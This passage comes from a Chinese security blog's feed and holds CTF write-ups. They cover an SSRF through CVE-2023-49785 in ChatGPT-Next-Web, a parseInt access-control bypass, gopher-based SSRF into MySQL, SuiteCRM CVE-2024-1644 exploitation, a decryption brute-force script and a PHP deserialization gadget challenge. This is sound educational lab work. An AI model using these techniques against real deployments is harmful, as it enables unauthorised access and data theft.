class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    PRIMENUM1_SSSCTF = <span class="number">100537</span></span><br><span class="line">    KEYWORD_SSSCTF = <span class="number">45452</span></span><br><span class="line">    MIN_ASC = <span class="number">32</span></span><br><span class="line">    MAX_ASC = <span class="number">126</span></span><br><span class="line">    NUM_ASC = MAX_ASC - MIN_ASC + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>) - <span class="number">1</span>):</span><br><span class="line">        ch = <span class="built_in">ord</span>(<span class="built_in">str</span>[i])</span><br><span class="line">        <span class="keyword">if</span> MIN_ASC &lt;= ch &lt;= MAX_ASC:</span><br><span class="line">            ch -= MIN_ASC</span><br><span class="line">            offset = <span class="built_in">round</span>((NUM_ASC + <span class="number">1</span>) * ((KEYWORD_SSSCTF * (i + <span class="number">1</span>)) % PRIMENUM1_SSSCTF) / PRIMENUM1_SSSCTF - <span class="number">0.5</span>)</span><br><span class="line">            ch = (ch - offset) % NUM_ASC</span><br><span class="line">            <span class="keyword">if</span> ch &lt; <span class="number">0</span>:</span><br><span class="line">                ch += NUM_ASC</span><br><span class="line">            ch += MIN_ASC</span><br><span class="line">            result += <span class="built_in">chr</span>(ch)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例用法</span></span><br><span class="line">decrypted_string = decipher_sssctf(<span class="string">&quot;~Ju1m++tij_^%R!Cz@;e\/(TOutE&gt;9.`.XSLKt@nf8asa&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted String:&quot;</span>, decrypted_string)</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2024/05/07/competition/202404/sssctf2024/image-20240507123225385.png" class="" title="image-20240507123225385"><p>根据之前出题人的提示，说可以爆出来。当时也尝试过，可惜的是解密算法没有写对，所以没有爆出来。。。</p><p>（当时考虑了keyword有可能是字符串的原因，所以后面就没怎么想了）</p><h1 id="scr1wgpt"><a href="#scr1wgpt" class="headerlink" title="scr1wgpt"></a>scr1wgpt</h1><p>这里根据提示，发现过滤了or和and，考虑用||和&amp;&amp;绕过；由于登录界面只有login failed，所以考虑时间注入</p><p>脚本如下：（环境有点问题，略)</p><p>得到用户名密码分别为：<code>Scr1w_admin</code>，<code>sssctf2024_P@ssvv0rd</code></p><p>GPT那有一个CVE漏洞，为<code>CVE-2023-49785</code></p><h2 id="CVE-2023-49785"><a href="#CVE-2023-49785" class="headerlink" title="CVE-2023-49785"></a>CVE-2023-49785</h2><p>ChatGPT-Next-Web 的 API Endpoint <code>/api/cors</code> 上存在 SSRF 漏洞，可被用于从服务器端发起任意网络请求并取得响应内容。</p><p><code>/api/cors</code>用于开放代理，允许未经身份验证的用户通过它发送任意HTTP请求，不过这会存在一个问题：<strong>它允许客户端通过服务器端端点访问跨域资源，从而绕过内置的浏览器保护以访问跨域资源。</strong></p><p>例如下图：</p><img src="/2024/05/07/competition/202404/sssctf2024/image-20240508144550526.png" class="" title="image-20240508144550526"><p>由于题目告诉我们flag是被藏在scr1wgpt-web里，所以直接访问<code>/api/cors/http/scr1wgpt-web/generator</code></p><img src="/2024/05/07/competition/202404/sssctf2024/image-20240508144705490.png" class="" title="image-20240508144705490">]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;计费系统&quot;&gt;&lt;a href=&quot;#计费系统&quot; class=&quot;headerlink&quot; title=&quot;计费系统&quot;&gt;&lt;/a&gt;计费系统&lt;/h1&gt;&lt;img src=&quot;/2024/05/07/competition/202404/sssctf2024/image-20240507113355447.png&quot; class=&quot;&quot; title=&quot;image-20240507113355447&quot;&gt;

&lt;p&gt;这一页是没有注入的，只能sso登录&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>dasctf_gfctf四月赛复现</title>
    <link href="http://luffys93.github.io/2024/04/22/competition/202404/dasctf-gfctf/"/>
    <id>http://luffys93.github.io/2024/04/22/competition/202404/dasctf-gfctf/</id>
    <published>2024-04-22T01:49:17.000Z</published>
    <updated>2024-07-31T08:37:25.289Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="cool-index"><a href="#cool-index" class="headerlink" title="cool_index"></a>cool_index</h2><p>这道题当时看了看，以为是jwt伪造，结果发现不能改token，因为动token会导致系统执行<code>res.clearCookie(&quot;token&quot;);</code>，因此伪造方面只能放一放</p><p>这里主要分析<code>/article</code>，它是读取flag的关键</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/article&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>;</span><br><span class="line">    <span class="keyword">if</span> (token) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> decoded = jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>);</span><br><span class="line">            <span class="keyword">let</span> index = req.<span class="property">body</span>.<span class="property">index</span>;</span><br><span class="line">            <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">index</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;你知道我要说什么&quot;</span> &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (decoded.<span class="property">subscription</span> !== <span class="string">&quot;premium&quot;</span> &amp;&amp; index &gt;= <span class="number">7</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> res</span><br><span class="line">                    .<span class="title function_">status</span>(<span class="number">403</span>)</span><br><span class="line">                    .<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;订阅高级会员以解锁&quot;</span> &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            index = <span class="built_in">parseInt</span>(index);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="built_in">isNaN</span>(index) || index &gt; articles.<span class="property">length</span> - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;你知道我要说什么&quot;</span> &#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">json</span>(articles[index]);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            res.<span class="title function_">clearCookie</span>(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;重新登录罢&quot;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;未登录&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><span id="more"></span><p>其实你把整个<code>server.js</code>看完之后，感觉没有利用点，因为开发者对token进行了严格地检查，防止攻击者利用token来绕过管理员的权限读取flag</p><p>不过注意到<code>index = parseInt(index);</code>，<code>parseInt()</code>用于将字符串转换为数字</p><img src="/2024/04/22/competition/202404/dasctf-gfctf/image-20240422100214436.png" class="" title="image-20240422100214436"><p>转换原理跟php差不多，就不赘述了</p><p>由于这一句是放在检测身份和页面之后的，因此可以直接传入含数字的字符串来访问flag</p><img src="/2024/04/22/competition/202404/dasctf-gfctf/image-20240422100419329.png" class="" title="image-20240422100419329"><img src="/2024/04/22/competition/202404/dasctf-gfctf/image-20240422100641059.png" class="" title="image-20240422100641059"><h2 id="EasySignin"><a href="#EasySignin" class="headerlink" title="EasySignin"></a>EasySignin</h2><p>注册一个账号登录进去，修改密码时抓包，把<code>username</code>改为<code>admin</code></p><img src="/2024/04/22/competition/202404/dasctf-gfctf/image-20240422100928781.png" class="" title="image-20240422100928781"><p>重新登录后查看图片，注意到url那一栏可以利用SSRF</p><p>试了一下，本地文件是读不了的，因此没法用<code>file://</code>，那就试试<code>gopher://</code></p><p>发现可以打3306，即mysql的默认端口</p><img src="/2024/04/22/competition/202404/dasctf-gfctf/image-20240422103021562.png" class="" title="image-20240422103021562"><img src="/2024/04/22/competition/202404/dasctf-gfctf/image-20240422103121304.png" class="" title="image-20240422103121304"><p>用gopherus打一下</p><img src="/2024/04/22/competition/202404/dasctf-gfctf/image-20240422104134992.png" class="" title="image-20240422104134992"><p>得到的payload进行二次编码，因为这里面有的字符解码后是个乱码，服务器在将其经过解码后可能会出现payload失效的情况</p><img src="/2024/04/22/competition/202404/dasctf-gfctf/image-20240422104616553.png" class="" title="image-20240422104616553"><p>解码后得到flag</p><img src="/2024/04/22/competition/202404/dasctf-gfctf/image-20240422104646167.png" class="" title="image-20240422104646167"><h2 id="SuiteCRM"><a href="#SuiteCRM" class="headerlink" title="SuiteCRM"></a>SuiteCRM</h2><p>提示已经说了是<code>CVE-2024-1644</code>，跟着复现就好了</p><p>由于环境修改了upload目录的上传权限，我就用最近才学的pear文件包含来执行命令</p><img src="/2024/04/22/competition/202404/dasctf-gfctf/image-20240422123738506.png" class="" title="image-20240422123738506"><p>直接读取flag</p><img src="/2024/04/22/competition/202404/dasctf-gfctf/image-20240422124307388.png" class="" title="image-20240422124307388"><h2 id="web1234"><a href="#web1234" class="headerlink" title="web1234"></a>web1234</h2><p>这题附件不知道跑哪去了，只能看看wp了</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;cool-index&quot;&gt;&lt;a href=&quot;#cool-index&quot; class=&quot;headerlink&quot; title=&quot;cool_index&quot;&gt;&lt;/a&gt;cool_index&lt;/h2&gt;&lt;p&gt;这道题当时看了看，以为是jwt伪造，结果发现不能改token，因为动token会导致系统执行&lt;code&gt;res.clearCookie(&amp;quot;token&amp;quot;);&lt;/code&gt;，因此伪造方面只能放一放&lt;/p&gt;
&lt;p&gt;这里主要分析&lt;code&gt;/article&lt;/code&gt;，它是读取flag的关键&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;app.&lt;span class=&quot;title function_&quot;&gt;post&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;/article&amp;quot;&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;(&lt;span class=&quot;params&quot;&gt;req, res&lt;/span&gt;) =&amp;gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; token = req.&lt;span class=&quot;property&quot;&gt;cookies&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;token&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (token) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; decoded = jwt.&lt;span class=&quot;title function_&quot;&gt;verify&lt;/span&gt;(token, &lt;span class=&quot;variable constant_&quot;&gt;JWT_SECRET&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; index = req.&lt;span class=&quot;property&quot;&gt;body&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;index&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (req.&lt;span class=&quot;property&quot;&gt;body&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;index&lt;/span&gt; &amp;lt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; res.&lt;span class=&quot;title function_&quot;&gt;status&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;400&lt;/span&gt;).&lt;span class=&quot;title function_&quot;&gt;json&lt;/span&gt;(&amp;#123; &lt;span class=&quot;attr&quot;&gt;message&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&amp;quot;你知道我要说什么&amp;quot;&lt;/span&gt; &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (decoded.&lt;span class=&quot;property&quot;&gt;subscription&lt;/span&gt; !== &lt;span class=&quot;string&quot;&gt;&amp;quot;premium&amp;quot;&lt;/span&gt; &amp;amp;&amp;amp; index &amp;gt;= &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; res&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    .&lt;span class=&quot;title function_&quot;&gt;status&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;403&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    .&lt;span class=&quot;title function_&quot;&gt;json&lt;/span&gt;(&amp;#123; &lt;span class=&quot;attr&quot;&gt;message&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&amp;quot;订阅高级会员以解锁&amp;quot;&lt;/span&gt; &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            index = &lt;span class=&quot;built_in&quot;&gt;parseInt&lt;/span&gt;(index);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;title class_&quot;&gt;Number&lt;/span&gt;.&lt;span class=&quot;built_in&quot;&gt;isNaN&lt;/span&gt;(index) || index &amp;gt; articles.&lt;span class=&quot;property&quot;&gt;length&lt;/span&gt; - &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; res.&lt;span class=&quot;title function_&quot;&gt;status&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;400&lt;/span&gt;).&lt;span class=&quot;title function_&quot;&gt;json&lt;/span&gt;(&amp;#123; &lt;span class=&quot;attr&quot;&gt;message&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&amp;quot;你知道我要说什么&amp;quot;&lt;/span&gt; &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; res.&lt;span class=&quot;title function_&quot;&gt;json&lt;/span&gt;(articles[index]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt; (error) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            res.&lt;span class=&quot;title function_&quot;&gt;clearCookie&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;token&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; res.&lt;span class=&quot;title function_&quot;&gt;status&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;403&lt;/span&gt;).&lt;span class=&quot;title function_&quot;&gt;json&lt;/span&gt;(&amp;#123; &lt;span class=&quot;attr&quot;&gt;message&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&amp;quot;重新登录罢&amp;quot;&lt;/span&gt; &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; res.&lt;span class=&quot;title function_&quot;&gt;status&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;403&lt;/span&gt;).&lt;span class=&quot;title function_&quot;&gt;json&lt;/span&gt;(&amp;#123; &lt;span class=&quot;attr&quot;&gt;message&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&amp;quot;未登录&amp;quot;&lt;/span&gt; &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Computer-Internet3</title>
    <link href="http://luffys93.github.io/2024/04/10/ComputerInternet/Computer-Internet3/"/>
    <id>http://luffys93.github.io/2024/04/10/ComputerInternet/Computer-Internet3/</id>
    <published>2024-04-10T08:25:40.000Z</published>
    <updated>2024-04-11T08:39:06.561Z</updated>
    
    <content type="html"><![CDATA[<h1 id="运输层"><a href="#运输层" class="headerlink" title="运输层"></a>运输层</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;运输层&quot;&gt;&lt;a href=&quot;#运输层&quot; class=&quot;headerlink&quot; title=&quot;运输层&quot;&gt;&lt;/a&gt;运输层&lt;/h1&gt;
      
    
    </summary>
    
    
      <category term="计网" scheme="http://luffys93.github.io/categories/%E8%AE%A1%E7%BD%91/"/>
    
    
  </entry>
  
  <entry>
    <title>nssctf-round20</title>
    <link href="http://luffys93.github.io/2024/03/30/nssctf/nssctf-round20/"/>
    <id>http://luffys93.github.io/2024/03/30/nssctf/nssctf-round20/</id>
    <published>2024-03-30T05:38:05.000Z</published>
    <updated>2024-07-31T06:11:37.171Z</updated>
    
    <content type="html"><![CDATA[<h1 id="真亦假，假亦真"><a href="#真亦假，假亦真" class="headerlink" title="真亦假，假亦真"></a>真亦假，假亦真</h1><p>dirsearch扫扫就行，有个<code>/flag</code></p><img src="/2024/03/30/nssctf/nssctf-round20/image-20240330135417001.png" class="" title="image-20240330135417001">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;真亦假，假亦真&quot;&gt;&lt;a href=&quot;#真亦假，假亦真&quot; class=&quot;headerlink&quot; title=&quot;真亦假，假亦真&quot;&gt;&lt;/a&gt;真亦假，假亦真&lt;/h1&gt;&lt;p&gt;dirsearch扫扫就行，有个&lt;code&gt;/flag&lt;/code&gt;&lt;/p&gt;
&lt;img src=&quot;/
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>buu做题记录（2）</title>
    <link href="http://luffys93.github.io/2024/03/29/buuctf/buu2/"/>
    <id>http://luffys93.github.io/2024/03/29/buuctf/buu2/</id>
    <published>2024-03-29T09:46:22.000Z</published>
    <updated>2024-07-31T08:37:00.089Z</updated>
    
    <content type="html"><![CDATA[<p>:::warning no-icon</p><p>做题记录如下</p><p><a href="https://luffys93.github.io/buuctf/buu/">buu1</a> -&gt; <a href="https://luffys93.github.io/buuctf/buu2/">buu2</a></p><p>:::</p><p>书接上回</p><h1 id="NewStarCTF-2023-公开赛道-POP-Gadget"><a href="#NewStarCTF-2023-公开赛道-POP-Gadget" class="headerlink" title="[NewStarCTF 2023 公开赛道]POP Gadget"></a>[NewStarCTF 2023 公开赛道]POP Gadget</h1><span id="more"></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span 